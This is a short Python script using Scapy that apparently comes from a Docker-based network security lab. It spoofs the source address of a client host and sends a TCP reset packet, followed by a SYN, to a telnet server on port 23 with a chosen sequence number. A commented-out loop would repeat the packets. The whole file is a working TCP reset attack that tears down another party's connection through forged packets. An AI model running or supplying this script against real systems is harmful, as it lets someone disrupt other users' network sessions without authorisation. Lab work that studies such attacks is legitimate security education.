#!/usr/bin/python3
from scapy.all import *

user="172.17.0.2"
server="172.17.0.3"
attacker="172.17.0.4"

sport=55500
seq=103634612

print("SENDING RESET PACKET.........")


ip = IP(src=user, dst=server)
tcp1 = TCP(sport=sport, dport=23,flags="R",seq=seq)

tcp2 = TCP(sport=sport, dport=23,flags="S",seq=1)

pkt1 = ip/tcp1
pkt2 = ip/tcp2

send(pkt1,verbose=0)
send(pkt2,verbose=0)

#for i in range(1,100):
	#send(pkt1,verbose=0)
	#send(pkt2,verbose=0)
	#ls(pkt)